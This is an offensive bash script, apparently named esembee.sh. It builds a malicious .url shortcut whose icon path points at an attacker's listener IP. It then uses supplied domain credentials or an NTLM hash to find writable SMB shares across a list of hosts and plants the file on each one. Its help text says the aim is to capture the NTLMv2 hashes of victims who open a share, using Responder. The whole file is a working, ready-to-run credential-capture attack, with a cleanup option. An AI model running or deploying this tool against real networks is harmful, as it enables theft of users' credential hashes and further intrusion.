#!/bin/bash

######
###Functions of the script listed below
######
#######function for the URL file creation
function URLfilecreation () {
echo "Beginning URL file creation"
if [[ ! -v IP ]];
then
echo "-L argument not found."
echo "Searching for IPs on local system." 
ifconfig | grep -w inet | awk -F" " '{print $2}'
echo " Local IPs on current system found.  IPs on current system listed above. Which IP would you like to use?" 
read IP
fi
Filenamecreation
echo '[InternetShortcut]
URL=http://google.com
WorkingDirectory=%username%
IconFile=\\'$IP'\%USERNAME%.icon
IconIndex=1' > $urlfile
}
####
###generator###
#####
function Generator () {
echo "URL File Generator selected"
if [[ ! -v IP ]];
then
echo "-L argument not found."
echo "Searching for IPs on local system." 
ifconfig | grep -w inet | awk -F" " '{print $2}'
echo " Local IPs on current system found.  IPs on current system listed above. Which IP would you like to use?" 
read IP
fi
Filenamecreation
echo '[InternetShortcut]
URL=http://google.com
WorkingDirectory=%username%
IconFile=\\'$IP'\%USERNAME%.icon
IconIndex=1' > $urlfile
echo "file $urlfile created with listener IP $IP"
exit
}
######
###Function for File name creation
#######
#######
function Filenamecreation () {
echo "Please specify the name for the file. It must begin with an @ and end with the .url extension"
read urlfile
echo "$urlfile selected"
}
######
###Function for selction for Fileremoval
#######
#######
function FileRemovalSelection () {
echo "Locating File for removal"
ls *.url
echo "Found url file(s)"
echo "would you like to remove one of these? [y or n]"
read URLFileconfirmation
if [ $URLFileconfirmation == y ]
then
	urlfilearray=( $(ls *.url) )
	echo "please select a file"
	select urlfile in "${urlfilearray[@]}"
	do
	echo "you selected $urlfile"
	break
	done
fi
}
##################Function for URL file selection
function FileSelection () {
echo "Searching PWD for URL file"
	urlfilearray=( $(ls *.url) )
	echo "please select a file"
	select urlfile in "${urlfilearray[@]}"
	do
	echo "you selected $urlfile"
	break
	done
}


######function for the file placement
function URLfileplacement () {
if [[ -v allips ]]
then
if [[ -v targetip ]];
then
echo "Too many targets specified. Specify a list of IPs with -f or a single IP (-I) and share (-S) exiting..."
exit
fi
if [[ -v share ]];
then
echo "Too many targets specified. Specify a list of IPs with -f or a single IP (-I) and share (-S) exiting..."
exit
fi
Lines=$(cat $allips)
for Line in $Lines
do
   echo "Testing SMB connection to "$Line""
   readarray -t lines < <(smbclient -L "$Line" -U "$u"%"$p" $h  | grep "Disk" | awk -F" " '{print $1}') 
   	for line in "${lines[@]}"; do
        if smbclient \\\\"$Line"\\"$line" -U $u%$p $h -c "put $urlfile" >/dev/null 2>&1
   	then 
   	echo "$u has write permissions for $line at $Line" 
   	echo "File $urlfile placed on $Line at share $line" 
   	fi
   	done
done
else
if [[ ! -v targetip ]];
then
echo "Target IP not set. Set with -T argument"
exit
fi
if [[ ! -v share ]];
then
echo "Target Share not set. Set with -S argument."
exit
fi
echo "Testing connection to $targetip"
smbclient \\\\"$targetip"\\"$share" -U $u%$p $h -c "put $urlfile" 
fi
}
###########Function for Scope check###
################
###########
#######Function for the cleanup option
function URLfileremoval () {
if [[ -v urlfile ]];
then echo "attempting removal of "$urlfile""
else
FileSelection
fi
if [[ -v allips ]]
then
if [[ -v targetip ]];
then
echo "Too many targets specified. Specify a list of IPs with -f or a single IP (-I) and share (-S) exiting..."
exit
fi
if [[ -v share ]];
then
echo "Too many targets specified. Specify a list of IPs with -f or a single IP (-I) and share (-S) exiting..."
exit
fi
Lines=$(cat $allips)
for Line in $Lines
do
   echo "Testing SMB connection to "$Line""
   readarray -t lines < <(smbclient -L "$Line" -U "$u"%"$p" $h  | grep "Disk" | awk -F" " '{print $1}') 
   	for line in "${lines[@]}"; do
        if smbclient \\\\"$Line"\\"$line" -U $u%$p $h -c "rm $urlfile" >/dev/null 2>&1
   	then 
   	echo "$u has write permissions for $line at $Line" 
   	echo "File $urlfile removed on $Line at share $line" 
   	fi
   	done
done
else
if [[ ! -v targetip ]];
then
echo "Target IP not set. Set with -T argument"
exit
fi
if [[ ! -v share ]];
then
echo "Target Share not set. Set with -S argument."
exit
fi
echo "Testing connection to $targetip"
smbclient \\\\"$targetip"\\"$share" -U $u%$p $h -c "rm $urlfile" 
fi
exit
}
########################
#######Function for Test write access####
function Testconnection () {
if [[ -v allips ]];
then
if [[ -v targetip ]];
then
echo "Too many targets specified. Specify a list of IPs with -f or a single IP (-I) and share (-S) exiting..."
exit
fi
if [[ -v share ]];
then
echo "Too many targets specified. Specify a list of IPs with -f or a single IP (-I) and share (-S) exiting..."
exit
fi
Lines=$(cat $allips)
for Line in $Lines
do
   touch testfile.txt
   echo "Testing SMB connection to "$Line""
   readarray -t lines < <(smbclient -L "$Line" -U "$u"%"$p" $h  | grep "Disk" | awk -F" " '{print $1}') 
   	for line in "${lines[@]}"; do
   	if smbclient \\\\"$Line"\\"$line" -U $u%$p $h -c "put testfile.txt ; rm testfile.txt" >/dev/null 2>&1 
   	then 
   	echo "$u has write access to $line at $Line"
   	fi
   	done
done
else
if [[ ! -v targetip ]];
then
echo "Target IP not set. Set with -T argument"
exit
fi
if [[ ! -v share ]];
then
echo "Target Share not set. Set with -S argument."
exit
fi
touch testfile.txt
echo "Testing connection to $targetip"
if smbclient \\\\"$targetip"\\"$share" -U $u%$p $h -c "put testfile.txt ; rm testfile.txt" >/dev/null 2>&1
then
echo "$u has write access to $share at $targetip."
else
echo "$u cannot write to $share at $targetip." 
fi
fi
rm testfile.txt
exit
}

#############
########Variable Check Function####
##############################
function variablecheck () {
if [[ ! -v u ]];
then
echo "Username not set. Use -u to set username. Exiting..."
exit
fi
if [[ ! -v p ]];
then
echo "password not set. Use -p to set password. Exiting..."
exit
fi
}
############HELPMENU########
function helpmenu () {
   # Display Help
   echo "This script can generate a a malicious URL file containing the IP of a listener, scan a scope of IPs for write access, and place the URL file on writable shares. When the share is accessed by a victim, their NTLMv2 hash can be captured via a listener like Responder." 
   echo
   echo "To specify a target: Either a list of IPs can be supplied with the -f option or a specific target IP can be supplied with -I along with a specific share -S, ie ./esembee.sh -I <target IP> -S <target share> or ./esembee.sh -f <scopeips.txt>"
   echo
   echo "Syntax to generate and place URL file on target IP and share: ./esembee.sh -u <domain/username> -p <password> -I <192.168.8.8> -S <sharename>"
   echo
   echo "Syntax to run cleanup on a specific share: ./esembee.sh -u <domain/username> -p <password> -I <192.168.8.8> -S <sharename> -C -F <urlfile>"
   echo
   echo "Syntax to scan scope of IPs for write access: ./esembee.sh -u <domain/username> -p <password> -f <scopeIPs.txt> -t"
   echo
   echo "options:"
   echo "-u     This argument is required. Supply the domain/username"
   echo "-p     This argument is required. Supply the password or hash of the domain user"
   echo "-h     Optional argument to use when the supplied password is an NTLM hash"
   echo "-I     Optional target specification for a single IP. Must also specify the share with the -S argument"
   echo "-S     Optional target specification to be used in conjunction with the -I argument"
   echo "-f     Optional target specification. Supply a txt file of possible target IPs"
   echo "-C     Optional argument to run the clean up utility to remove the URL file."
   echo "-F     Optional argument if you already have a URL file created. If not specified the tool will assist with generating a URL file."
   echo "-t     Optional argument to test for write access against against a target."
   echo "-L     Optional argument to set the IP for the listener in the URL file and bypass the user input during URL file creation process"
   echo "-G     Optional argument to just run the URL File Generator."
exit
}
####OPTIONS FOR SCRIPT#####
while getopts t,u:p:f:H,h,C,F:I:S:L:G options; do
	case $options in
		u) u=$OPTARG;;
		p) p=$OPTARG;;
		f) allips=$OPTARG;;
		H) h=--pw-nt-hash;;
		t) t=Testconnection;;
		h) Help=helpmenu;;
		C) cleanup=URLfileremoval;;
		F) urlfile=$OPTARG;;
		I) targetip=$OPTARG;;
		S) share=$OPTARG;;
		L) IP=$OPTARG;;
		G) Generate=Generator;;
		?) echo "unknown option set exiting.."
		exit;;
	esac
done
################### SCRIPT ACTIONS  ####################################
$Help
$Generate
variablecheck
$t
$cleanup
if [[ -v urlfile ]];
then
"URLfileplacement"
else
echo "No URL file set. Do you need a URL file created? [y or n]"
read Filecreationneeded
if [ $Filecreationneeded == y ]
then "URLfilecreation"
"URLfileplacement"
else 
"FileSelection"
"URLfileplacement"
fi
fi
